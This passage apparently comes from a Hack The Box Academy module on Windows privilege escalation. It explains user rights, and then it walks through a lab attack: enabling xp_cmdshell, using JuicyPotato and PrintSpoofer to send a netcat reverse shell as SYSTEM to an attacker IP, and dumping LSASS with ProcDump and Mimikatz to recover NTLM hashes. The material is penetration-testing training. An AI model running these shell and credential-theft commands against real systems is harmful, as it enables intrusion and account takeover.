</tr>
<tr>
<td>SeRemoteInteractiveLogonRight</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services">Allow log on through Remote Desktop Services</a></td>
<td>Administrators, Remote Desktop Users</td>
<td>This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.</td>
</tr>
<tr>
<td>SeBackupPrivilege</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/back-up-files-and-directories">Back up files and directories</a></td>
<td>Administrators</td>
<td>This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.</td>
</tr>
<tr>
<td>SeSecurityPrivilege</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/manage-auditing-and-security-log">Manage auditing and security log</a></td>
<td>Administrators</td>
<td>This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.</td>
</tr>
<tr>
<td>SeTakeOwnershipPrivilege</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects">Take ownership of files or other objects</a></td>
<td>Administrators</td>
<td>This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.</td>
</tr>
<tr>
<td>SeDebugPrivilege</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs">Debug programs</a></td>
<td>Administrators</td>
<td>This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.</td>
</tr>
<tr>
<td>SeImpersonatePrivilege</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication">Impersonate a client after authentication</a></td>
<td>Administrators, Local Service, Network Service, Service</td>
<td>This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.</td>
</tr>
<tr>
<td>SeLoadDriverPrivilege</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/load-and-unload-device-drivers">Load and unload device drivers</a></td>
<td>Administrators</td>
<td>This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.</td>
</tr>
<tr>
<td>SeRestorePrivilege</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories">Restore files and directories</a></td>
<td>Administrators</td>
<td>This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.</td>
</tr>
</tbody>
</table>
<p>Further information can be found <a href="https://4sysops.com/archives/user-rights-assignment-in-windows-server-2016/">here</a>.</p>
<p>Typing the command <code>whoami /priv</code> will give you a listing of all user rights assigned to your current user. Some rights are only available to administrative users and can only be listed/leveraged when running an elevated cmd or PowerShell session. These concepts of elevated rights and <a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">User Account Control (UAC)</a> are security features introduced with Windows Vista to default to restricting applications from running with full permissions unless necessary. If we compare and contrast the rights available to us as an admin in a non-elevated console vs. an elevated console, we will see that they differ drastically.</p>
<p>Below are the rights available to a local administrator account on a Windows system.</p>
<p><strong>Local Admin User Rights - Elevated</strong></p>
<p>If we run an elevated command window, we can see the complete listing of rights available to us:</p>
<p>Windows Privileges Overview</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; whoami 

winlpe-srv01\administrator


PS C:\htb&gt; whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="hljs-keyword">for</span> a process                                 Disabled
SeSecurityPrivilege                       Manage auditing <span class="hljs-keyword">and</span> security <span class="hljs-built_in">log</span>                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files <span class="hljs-keyword">or</span> other objects                           Disabled
SeLoadDriverPrivilege                     <span class="hljs-keyword">Load</span> <span class="hljs-keyword">and</span> unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile <span class="hljs-keyword">system</span> performance                                         Disabled
SeSystemtimePrivilege                     Change the <span class="hljs-keyword">system</span> <span class="hljs-built_in">time</span>                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 <span class="hljs-keyword">Create</span> a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files <span class="hljs-keyword">and</span> directories                                      Disabled
SeRestorePrivilege                        Restore files <span class="hljs-keyword">and</span> directories                                      Disabled
SeShutdownPrivilege                       Shut down the <span class="hljs-keyword">system</span>                                               Disabled
SeDebugPrivilege                          <span class="hljs-keyword">Debug</span> programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote <span class="hljs-keyword">system</span>                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform <span class="hljs-built_in">volume</span> maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   <span class="hljs-keyword">Create</span> global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the <span class="hljs-built_in">time</span> zone                                               Disabled
SeCreateSymbolicLinkPrivilege             <span class="hljs-keyword">Create</span> symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation <span class="hljs-built_in">token</span> <span class="hljs-keyword">for</span> another user in the same session Disabled
</code></pre>
<p>When a privilege is listed for our account in the <code>Disabled</code> state, it means that our account has the specific privilege assigned. Still, it cannot be used in an access token to perform the associated actions until it is enabled. Windows does not provide a built-in command or PowerShell cmdlet to enable privileges, so we need some scripting to help us out. We will see ways to abuse various privileges throughout this module and various ways to enable specific privileges within our current process. One example is this PowerShell <a href="https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts/Enable-Privilege.ps1">script</a> which can be used to enable certain privileges, or this <a href="https://www.leeholmes.com/adjusting-token-privileges-in-powershell/">script</a> which can be used to adjust token privileges.</p>
<p>A standard user, in contrast, has drastically fewer rights.</p>
<p><strong>Standard User Rights</strong></p>
<p>Windows Privileges Overview</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; whoami 

winlpe-srv01\htb-student


PS C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</code></pre>
<p>User rights increase based on the groups they are placed in or their assigned privileges. Below is an example of the rights granted to users in the <code>Backup Operators</code> group. Users in this group do have other rights that UAC currently restricts. Still, we can see from this command that they have the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/shut-down-the-system">SeShutdownPrivilege</a>, which means that they can shut down a domain controller that could cause a massive service interruption should they log onto a domain controller locally (not via RDP or WinRM).</p>
<p><strong>Backup Operators Rights</strong></p>
<p>Windows Privileges Overview</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</code></pre>
<hr>
<h3 id="detection">Detection</h3>
<p>This <a href="https://blog.palantir.com/windows-privilege-abuse-auditing-detection-and-defense-3078a403d74e">post</a> is worth a read for more information on Windows privileges as well as detecting and preventing abuse, specifically by logging event <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672">4672: Special privileges assigned to new logon</a> which will generate an event if certain sensitive privileges are assigned to a new logon session. This can be fine-tuned in many ways, such as by monitoring privileges that should <em>never</em> be assigned or those that should only ever be assigned to specific accounts.</p>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>As attackers and defenders, we need to review the membership of these groups. It&#39;s not uncommon to find seemingly low privileged users added to one or more of these groups, which can be used to compromise a single host or further access within an Active Directory environment. We will discuss the implications of some of the most common rights and walk through exercises on how to escalate privileges if we obtain access to a user with some of these rights assigned to their account.</p>
<h2 id="seimpersonate-and-seassignprimarytoken">SeImpersonate and SeAssignPrimaryToken</h2>
<hr>
<p>In Windows, every process has a token that has information about the account that is running it. These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. To utilize the token, the <code>SeImpersonate</code> privilege is needed. It is only given to administrative accounts, and in most cases, can be removed during system hardening. An example of using this token would be <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw">CreateProcessWithTokenW</a>.</p>
<p>Legitimate programs may utilize another process&#39;s token to escalate from Administrator to Local System, which has additional privileges. Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space. Attackers often abuse this privilege in the &quot;Potato style&quot; privescs - where a service account can <code>SeImpersonate</code>, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.</p>
<p>We will often run into this privilege after gaining remote code execution via an application that runs in the context of a service account (for example, uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries). Whenever we gain access in this way, we should immediately check for this privilege as its presence often offers a quick and easy route to elevated privileges. This <a href="https://github.com/hatRiot/token-priv/blob/master/abusing\_token\_eop\_1.0.txt">paper</a> is worth reading for further details on token impersonation attacks.</p>
<hr>
<h3 id="seimpersonate-example-juicypotato">SeImpersonate Example - JuicyPotato</h3>
<p>Let&#39;s take the example below, where we have gained a foothold on a SQL server using a privileged SQL user. Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/impersonate-a-client-after-authentication">Impersonate a client after authentication</a> privilege.</p>
<p>In this scenario, the SQL Service service account is running in the context of the default <code>mssqlserver</code> account. Imagine we have achieved command execution as this user using <code>xp_cmdshell</code> using a set of credentials obtained in a <code>logins.sql</code> file on a file share using the <code>Snaffler</code> tool.</p>
<p><strong>Connecting with MSSQLClient.py</strong></p>
<p>Using the credentials <code>sql_dev:Str0ng_P@ssw0rd!</code>, let&#39;s first connect to the SQL server instance and confirm our privileges. We can do this using <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">mssqlclient.py</a> from the <code>Impacket</code> toolkit.</p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright <span class="hljs-number">2020</span> SecureAuth Corporation

Password:
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] Encryption required, switching to TLS
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] ENVCHANGE(<span class="hljs-name">DATABASE</span>): Old Value: master, New Value: master
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] ENVCHANGE(<span class="hljs-name">LANGUAGE</span>): Old Value: None, New Value: us_english
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] ENVCHANGE(<span class="hljs-name">PACKETSIZE</span>): Old Value: <span class="hljs-number">4096</span>, New Value: <span class="hljs-number">16192</span>
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] INFO(<span class="hljs-name">WINLPE-SRV01</span>\SQLEXPRESS01): Line <span class="hljs-number">1</span>: Changed database context to <span class="hljs-symbol">'master</span><span class="hljs-symbol">'.</span>
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] INFO(<span class="hljs-name">WINLPE-SRV01</span>\SQLEXPRESS01): Line <span class="hljs-number">1</span>: Changed language setting to us_english.
[<span class="hljs-name"><span class="hljs-builtin-name">*</span></span>] ACK: Result: <span class="hljs-number">1</span> - Microsoft SQL Server (<span class="hljs-name">130</span> <span class="hljs-number">19162</span>) 
[<span class="hljs-name">!</span>] Press help for extra shell commands
SQL&gt;
</code></pre>
<p><strong>Enabling xp_cmdshell</strong></p>
<p>Next, we must enable the <code>xp_cmdshell</code> stored procedure to run operating system commands. We can do this via the Impacket MSSSQL shell by typing <code>enable_xp_cmdshell</code>. Typing <code>help</code> displays a few other command options.</p>
<pre><code class="lang-shell-session">SQL&gt; enable_xp_cmdshell

[*] INFO(WINLPE-SRV01<span class="hljs-string">\SQLEXPRESS01):</span> Line <span class="hljs-number">185</span>: Configuration option <span class="hljs-string">'show advanced options'</span> changed <span class="hljs-keyword">from</span> <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> <span class="hljs-number">1.</span> Run the RECONFIGURE statement <span class="hljs-keyword">to</span> install.
[*] INFO(WINLPE-SRV01<span class="hljs-string">\SQLEXPRESS01):</span> Line <span class="hljs-number">185</span>: Configuration option <span class="hljs-string">'xp_cmdshell'</span> changed <span class="hljs-keyword">from</span> <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> <span class="hljs-number">1.</span> Run the RECONFIGURE statement <span class="hljs-keyword">to</span> install
</code></pre>
<p>Note: We don&#39;t actually have to type <code>RECONFIGURE</code> as Impacket does this for us.</p>
<p><strong>Confirming Access</strong></p>
<p>With this access, we can confirm that we are indeed running in the context of a SQL Server service account.</p>
<pre><code class="lang-shell-session">SQL&gt; xp_cmdshell whoami

output                                                                             

-<span class="ruby">-------------------------------------------------------------------------------   
</span>
nt service\mssql$sqlexpress01
</code></pre>
<p><strong>Checking Account Privileges</strong></p>
<p>Next, let&#39;s check what privileges the service account has been granted.</p>
<pre><code class="lang-shell-session">SQL&gt; xp_cmdshell whoami /priv

output                                                                             

--------------------------------------------------------------------------------   

PRIVILEGES INFORMATION                                                             

----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege <span class="hljs-keyword">Replace</span> a process level <span class="hljs-keyword">token</span>             Disabled   
SeIncreaseQuotaPrivilege      <span class="hljs-keyword">Adjust</span> <span class="hljs-keyword">memory</span> quotas <span class="hljs-keyword">for</span> a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create <span class="hljs-keyword">global</span> objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-keyword">set</span>            Disabled
</code></pre>
<p>The command <code>whoami /priv</code> confirms that <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege</a> is listed. This privilege can be used to impersonate a privileged account such as <code>NT AUTHORITY\SYSTEM</code>. <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a> can be used to exploit the <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges via DCOM/NTLM reflection abuse.</p>
<p><strong>Escalating Privileges Using JuicyPotato</strong></p>
<p>To escalate privileges using these rights, let&#39;s first download the <code>JuicyPotato.exe</code> binary and upload this and <code>nc.exe</code> to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where <code>-l</code> is the COM server listening port, <code>-p</code> is the program to launch (cmd.exe), <code>-a</code> is the argument passed to cmd.exe, and <code>-t</code> is the <code>createprocess</code> call. Below, we are telling the tool to try both the <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw">CreateProcessWithTokenW</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera">CreateProcessAsUser</a> functions, which need <code>SeImpersonate</code> or <code>SeAssignPrimaryToken</code> privileges respectively.</p>
<pre><code class="lang-shell-session">SQL&gt; xp_cmdshell c:\tools\JuicyPotato.exe -l <span class="hljs-number">53375</span> -p c:\windows\system32\cmd.exe -a <span class="hljs-string">"/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"</span> -t *

output                                                                             

--------------------------------------------------------------------------------   

Testing {4991d34b-80a1-<span class="hljs-number">4291</span>-<span class="hljs-number">83b6</span>-<span class="hljs-number">3328366b9097</span>} <span class="hljs-number">53375</span>                               

[+] authresult <span class="hljs-number">0</span>                                                                   
{4991d34b-80a1-<span class="hljs-number">4291</span>-<span class="hljs-number">83b6</span>-<span class="hljs-number">3328366b9097</span>};NT AUTHORITY\SYSTEM                                                                                                    
[+] CreateProcessWithTokenW OK                                                     
[+] calling <span class="hljs-number">0x000000000088ce08</span>
</code></pre>
<p><strong>Catching SYSTEM Shell</strong></p>
<p>This completes successfully, and a shell as <code>NT AUTHORITY\SYSTEM</code> is received.</p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ sudo nc -lnvp <span class="hljs-number">8443</span>

listening on [<span class="hljs-name">any</span>] <span class="hljs-number">8443</span> ...
connect to [<span class="hljs-name">10.10.14.3</span>] from (<span class="hljs-name">UNKNOWN</span>) [<span class="hljs-name">10.129.43.30</span>] <span class="hljs-number">50332</span>
Microsoft Windows [<span class="hljs-name">Version</span> <span class="hljs-number">10.0</span>.14393]
(<span class="hljs-name">c</span>) <span class="hljs-number">2016</span> Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system


C:\Windows\system32&gt;hostname

hostname
WINLPE-SRV01
</code></pre>
<hr>
<h3 id="printspoofer-and-roguepotato">PrintSpoofer and RoguePotato</h3>
<p>JuicyPotato doesn&#39;t work on Windows Server 2019 and Windows 10 build 1809 onwards. However, <a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> and <a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> can be used to leverage the same privileges and gain <code>NT AUTHORITY\SYSTEM</code> level access. This <a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">blog post</a> goes in-depth on the <code>PrintSpoofer</code> tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.</p>
<p><strong>Escalating Privileges using PrintSpoofer</strong></p>
<p>Let&#39;s try this out using the <code>PrintSpoofer</code> tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with <code>mssqlclient.py</code> and use the tool with the <code>-c</code> argument to execute a command. Here, using <code>nc.exe</code> to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">SQL</span>&gt; <span class="hljs-selector-tag">xp_cmdshell</span> <span class="hljs-selector-tag">c</span>:\<span class="hljs-selector-tag">tools</span>\<span class="hljs-selector-tag">PrintSpoofer</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-c</span> "<span class="hljs-selector-tag">c</span>:\<span class="hljs-selector-tag">tools</span>\<span class="hljs-selector-tag">nc</span><span class="hljs-selector-class">.exe</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.3</span> 8443 <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span>"

<span class="hljs-selector-tag">output</span>                                                                             

<span class="hljs-selector-tag">--------------------------------------------------------------------------------</span>   

<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Found</span> <span class="hljs-selector-tag">privilege</span>: <span class="hljs-selector-tag">SeImpersonatePrivilege</span>                                        

<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">Named</span> <span class="hljs-selector-tag">pipe</span> <span class="hljs-selector-tag">listening</span>...                                                        

<span class="hljs-selector-attr">[+]</span> <span class="hljs-selector-tag">CreateProcessAsUser</span>() <span class="hljs-selector-tag">OK</span>                                                       

<span class="hljs-selector-tag">NULL</span>
</code></pre>
<p><strong>Catching Reverse Shell as SYSTEM</strong></p>
<p>If all goes according to plan, we will have a SYSTEM shell on our netcat listener.</p>
<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ nc -lnvp <span class="hljs-number">8443</span>

listening on [<span class="hljs-name">any</span>] <span class="hljs-number">8443</span> ...
connect to [<span class="hljs-name">10.10.14.3</span>] from (<span class="hljs-name">UNKNOWN</span>) [<span class="hljs-name">10.129.43.30</span>] <span class="hljs-number">49847</span>
Microsoft Windows [<span class="hljs-name">Version</span> <span class="hljs-number">10.0</span>.14393]
(<span class="hljs-name">c</span>) <span class="hljs-number">2016</span> Microsoft Corporation. All rights reserved.


C:\Windows\system32&gt;whoami

whoami
nt authority\system
</code></pre>
<p>Escalating privileges by leveraging <code>SeImpersonate</code> is very common. It is essential to be familiar with the various methods available to us depending on the target host OS version and level.</p>
<h2 id="sedebugprivilege">SeDebugPrivilege</h2>
<hr>
<p>To run a particular application or service or assist with troubleshooting, a user might be assigned the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs">SeDebugPrivilege</a> instead of adding the account into the administrators group. This privilege can be assigned via local or domain group policy, under <code>Computer Settings &gt; Windows Settings &gt; Security Settings</code>. By default, only administrators are granted this privilege as it can be used to capture sensitive information from system memory, or access/modify kernel and application structures. This right may be assigned to developers who need to debug new system components as part of their day-to-day job. This user right should be given out sparingly because any account that is assigned it will have access to critical operating system components.</p>
<p>During an internal penetration test, it is often helpful to use websites such as LinkedIn to gather information about potential users to target. Suppose we are, for example, retrieving many NTLMv2 password hashes using <code>Responder</code> or <code>Inveigh</code>. In that case, we may want to focus our password hash cracking efforts on possible high-value accounts, such as developers who are more likely to have these types of privileges assigned to their accounts. A user may not be a local admin on a host but have rights that we cannot enumerate remotely using a tool such as BloodHound. This would be worth checking in an environment where we obtain credentials for several users and have RDP access to one or more hosts but no additional privileges.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/debug.png" alt="image"></p>
<p>After logging on as a user assigned the <code>Debug programs</code> right and opening an elevated shell, we see <code>SeDebugPrivilege</code> is listed.</p>
<p>SeDebugPrivilege</p>
<pre><code class="lang-cmd-session">C:\htb&gt; whoami /priv

<span class="hljs-section">PRIVILEGES INFORMATION
----------------------</span>

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
</code></pre>
<p>We can use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">ProcDump</a> from the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">SysInternals</a> suite to leverage this privilege and dump process memory. A good candidate is the Local Security Authority Subsystem Service (<a href="https://en.wikipedia.org/wiki/Local\_Security\_Authority\_Subsystem\_Service">LSASS</a>) process, which stores user credentials after a user logs on to a system.</p>
<p>SeDebugPrivilege</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">procdump</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-accepteula</span> <span class="hljs-selector-tag">-ma</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.dmp</span>

<span class="hljs-selector-tag">ProcDump</span> <span class="hljs-selector-tag">v10</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">Sysinternals</span> <span class="hljs-selector-tag">process</span> <span class="hljs-selector-tag">dump</span> <span class="hljs-selector-tag">utility</span>
<span class="hljs-selector-tag">Copyright</span> (<span class="hljs-selector-tag">C</span>) 2009<span class="hljs-selector-tag">-2020</span> <span class="hljs-selector-tag">Mark</span> <span class="hljs-selector-tag">Russinovich</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">Andrew</span> <span class="hljs-selector-tag">Richards</span>
<span class="hljs-selector-tag">Sysinternals</span> <span class="hljs-selector-tag">-</span> <span class="hljs-selector-tag">www</span><span class="hljs-selector-class">.sysinternals</span><span class="hljs-selector-class">.com</span>

<span class="hljs-selector-attr">[15:25:45]</span> <span class="hljs-selector-tag">Dump</span> 1 <span class="hljs-selector-tag">initiated</span>: <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Tools</span>\<span class="hljs-selector-tag">Procdump</span>\<span class="hljs-selector-tag">lsass</span><span class="hljs-selector-class">.dmp</span>
<span class="hljs-selector-attr">[15:25:45]</span> <span class="hljs-selector-tag">Dump</span> 1 <span class="hljs-selector-tag">writing</span>: <span class="hljs-selector-tag">Estimated</span> <span class="hljs-selector-tag">dump</span> <span class="hljs-selector-tag">file</span> <span class="hljs-selector-tag">size</span> <span class="hljs-selector-tag">is</span> 42 <span class="hljs-selector-tag">MB</span>.
<span class="hljs-selector-attr">[15:25:45]</span> <span class="hljs-selector-tag">Dump</span> 1 <span class="hljs-selector-tag">complete</span>: 43 <span class="hljs-selector-tag">MB</span> <span class="hljs-selector-tag">written</span> <span class="hljs-selector-tag">in</span> 0<span class="hljs-selector-class">.5</span> <span class="hljs-selector-tag">seconds</span>
<span class="hljs-selector-attr">[15:25:46]</span> <span class="hljs-selector-tag">Dump</span> <span class="hljs-selector-tag">count</span> <span class="hljs-selector-tag">reached</span>.
</code></pre>
<p>This is successful, and we can load this in <code>Mimikatz</code> using the <code>sekurlsa::minidump</code> command. After issuing the <code>sekurlsa::logonPasswords</code> commands, we gain the NTLM hash of the local administrator account logged on locally. We can use this to perform a pass-the-hash attack to move laterally if the same local administrator password is used on one or multiple additional systems (common in large organizations).</p>
<p>Note: It is always a good idea to type &quot;log&quot; before running any commands in &quot;Mimikatz&quot; this way all command output will put output to a &quot;.txt&quot; file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.</p>
<p>SeDebugPrivilege</p>
<pre><code class="lang-cmd-session">C:\htb&gt; mimikatz.exe

  .#####.   mimikatz <span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (x64) #<span class="hljs-number">19041</span> Sep <span class="hljs-number">18</span> <span class="hljs-number">2020</span> <span class="hljs-number">19</span>:<span class="hljs-number">18</span>:<span class="hljs-number">29</span>
 .## ^ ##.  <span class="hljs-string">"A La Vie, A L'Amour"</span> - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using <span class="hljs-symbol">'mimikatz.log</span>' <span class="hljs-keyword">for</span> logfile : <span class="hljs-type">OK</span>

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : '<span class="hljs-type">lsass.dmp</span>'

mimikatz # sekurlsa::logonpasswords
Opening : '<span class="hljs-type">lsass.dmp</span>' file <span class="hljs-keyword">for</span> minidump...

Authentication Id : 0 ; <span class="hljs-number">23196355</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">0161</span>f2c3)
Session           : <span class="hljs-type">Interactive</span> from <span class="hljs-number">4</span>
User Name         : <span class="hljs-type">DWM</span>-<span class="hljs-number">4</span>
Domain            : <span class="hljs-type">Window</span> Manager
Logon Server      : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)
Logon Time        : 3/31/2021 3:00:57 <span class="hljs-type">PM</span>
SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">90</span>-<span class="hljs-number">0</span>-<span class="hljs-number">4</span>
        msv :
        <span class="hljs-type">tspkg</span> :
        <span class="hljs-type">wdigest</span> :
         * <span class="hljs-type">Username</span> : <span class="hljs-type">WINLPE</span>-SRV01$
         * Domain   : <span class="hljs-type">WORKGROUP</span>
         * Password : (<span class="hljs-keyword"><span class="hljs-keyword">null</span></span>)
        kerberos :
        <span class="hljs-type">ssp</span> :
        <span class="hljs-type">credman</span> :

&lt;<span class="hljs-type">SNIP</span>&gt; 

Authentication Id : 0 ; <span class="hljs-number">23026942</span> (<span class="hljs-number">00000000</span>:<span class="hljs-number">015</span>f5cfe)
Session           : <span class="hljs-type">RemoteInteractive</span> from <span class="hljs-number">2</span>
User Name         : <span class="hljs-type">jordan</span>
Domain            : <span class="hljs-type">WINLPE</span>-SRV01
Logon Server      : <span class="hljs-type">WINLPE</span>-SRV01
Logon Time        : 3/31/2021 2:59:52 <span class="hljs-type">PM</span>
SID               : <span class="hljs-type">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3769161915</span>-<span class="hljs-number">3336846931</span>-<span class="hljs-number">3985975925</span>-<span class="hljs-number">1000</span>
        msv :
         [00000003] <span class="hljs-type">Primary</span>
         * Username : <span class="hljs-type">jordan</span>
         * Domain   : <span class="hljs-type">WINLPE</span>-SRV01
         * NTLM     : <span class="hljs-type">cf3a5525ee9414229e66279623ed5c58</span>
